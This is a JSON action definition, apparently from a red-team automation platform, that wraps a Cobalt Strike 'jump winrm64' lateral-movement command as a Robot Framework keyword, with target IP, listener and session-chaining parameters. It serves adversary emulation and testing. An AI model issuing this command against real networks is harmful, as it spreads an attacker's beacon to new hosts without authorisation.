{
  "_key": "cs-lateral-winrm",
  "name": "Lateral Move WinRM",
  "description": "Move laterally to a target host using WinRM via Cobalt Strike bjump",
  "icon": "\ud83d\udd17",
  "tactic": "TA0008",
  "category": "Cobalt Strike",
  "subcategory": "Lateral Movement",
  "riskLevel": "High",
  "estimatedDuration": 30,
  "executionType": "cobalt_strike",
  "robotKeyword": "Lateral Move With Winrm",
  "robotTemplate": "${result}=    Run Bjump    ${session}    winrm64    ${target_ip}    ${listener_name}",
  "cobaltStrikeCommand": "jump winrm64 ${target_ip} ${listener_name}",
  "inputs": [
    {
      "id": "session",
      "label": "Source Beacon",
      "type": "Agent_Session",
      "required": true
    }
  ],
  "outputs": [
    {
      "id": "session",
      "label": "Remote Session",
      "type": "Agent_Session"
    }
  ],
  "parameters": [
    {
      "id": "session",
      "label": "Session",
      "type": "string",
      "required": true,
      "placeholder": "${session}"
    },
    {
      "id": "target_ip",
      "label": "Target IP",
      "type": "string",
      "required": true,
      "placeholder": "172.16.2.3"
    },
    {
      "id": "listener_name",
      "label": "Listener",
      "type": "string",
      "required": true,
      "placeholder": "HTTP",
      "default": "HTTP"
    }
  ],
  "requirements": {
    "c2Server": true,
    "listeners": [
      "HTTP"
    ]
  },
  "robotFramework": {
    "libraries": [
      "cobaltstrikec2/cobaltstrike.py"
    ],
    "keyword": "Lateral Move With Winrm",
    "captureOutput": "LATERAL_RESULT",
    "keywordArgs": [
      {
        "position": 1,
        "sessionVariable": "CURRENT_SESSION"
      },
      {
        "position": 2,
        "param": "target_ip"
      },
      {
        "position": 3,
        "param": "listener_name"
      }
    ],
    "postKeywordStatements": [
      "@{NEW_SESSIONS}=    Get Sessions By Ip    ${target_ip}",
      "${CURRENT_SESSION}=    SET VARIABLE    ${NEW_SESSIONS[0]}"
    ],
    "sessionVariable": "CURRENT_SESSION",
    "variables": [],
    "preKeywordLog": "Laterally moving to ${target_ip} via WinRM"
  }
}